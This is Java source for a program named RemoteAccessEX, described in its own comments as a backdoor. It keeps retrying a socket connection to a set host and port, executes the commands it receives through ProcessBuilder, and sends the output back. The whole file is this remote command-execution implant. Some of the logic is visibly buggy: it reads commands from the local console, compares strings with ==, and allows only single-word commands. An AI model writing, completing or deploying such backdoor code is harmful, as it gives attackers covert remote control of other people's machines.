
import java.util.*;
import java.net.*;
import java.io.*;
//methods to add, connect, execute, resolve
public class RemoteAccessEX{
  private static Socket s; //
  private static Scanner sc;//takes in input from stream
  private static PrintWriter pr;//write info to the socket
  private static int length;//amount of args passed to backdoor
  private static ProcessBuilder ps;// lets us execute commands
  private static BufferedReader in;//get output
  private static String line;
  private static String stdout;
  private static Boolean master;
  private static Console c;

  private static int connect(String ip, int port){///method attempts to create the connection
    try{
      s= new Socket(ip,port);
      //System.out.println("connected");
      return 1;
    }
    catch(Exception err){
      System.out.println(err.getMessage());
      return 0;
    }
  }

  private static String resolve(String host){
    //This method grabs the IP address of the host and return it as a string
    InetAddress ip;
    while(true){
      try{
        ip=InetAddress.getByName(host);
    //    System.out.println(ip);
        host=ip.getHostAddress().toString();
        return host;
      }
      catch(Exception err){
        continue;
      }
    }
  }

  private static String execute(String recieved) throws IOException, InterruptedException{
    String splitted[]= recieved.split(" ");
    length=splitted.length;
    if(length==1){
      try{
        ps = new ProcessBuilder(splitted[0]);
        ps.redirectErrorStream(true);
        Process pr = ps.start();
        in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
        line ="";
        stdout="";
        while((line = in.readLine())!=null){
          stdout=stdout+line;
        }
        stdout=stdout.toString();
        pr.waitFor();
        in.close();
        return stdout;
      }
      catch(Exception er){ return er.toString();}
    }
    else{return "to many args";}
  }


  public static void main(String args[]) throws IOException{
    String host="localhost";
    int port = 135;
    String ip=resolve(host);
    //System.out.println(ip);
    int stat=0;
    while(stat!=1){stat=connect(ip,port); //keep trying to connect
    System.out.println("connecting");}
    System.out.println("connected");//connected
    pr=new PrintWriter(s.getOutputStream(),true); // look at output stream
    sc = new Scanner(s.getInputStream());// look at input stream
    c= System.console();
    master=false;
    String answer = c.readLine("are you the master? (y/n): ");
    if(answer=="y"){master=true;}
    sc.useDelimiter("\0");//Delimiter is used in order to know the end of the message received.
    String recieved;
    String stdout;

    while(true){
      c.flush();
      System.out.println("listening");

      try{//try to recieve message
        System.out.println("entered try");

        recieved = c.readLine();

    //    recieved =  recieved.trim();
      //  recieved =  recieved.replace("\0","");
        System.out.println("got: "+recieved);
        //System.out.println("message got");

        if( recieved.contains("quit")){///exit if message is quit
          pr.println("quit");
          sc.close();
          s.close();
          System.exit(0);
        }
        else{//try to execute method sent
          stdout = execute(recieved);
          pr.print(stdout+"\0");
          pr.flush();
        }
      }
      catch(Exception err){//try again
        System.out.println(err.getMessage());
        //System.gc();
        stat=0;
        //System.out.println(ip);
        //System.out.println(port);
        do{
          stat=connect(ip,port);
        }while(stat!=1);
        //System.out.println("connected");
        pr=new PrintWriter(s.getOutputStream(),true);
        sc= new Scanner(s.getInputStream());
        sc.useDelimiter("\0");
      }
    }
    }
}
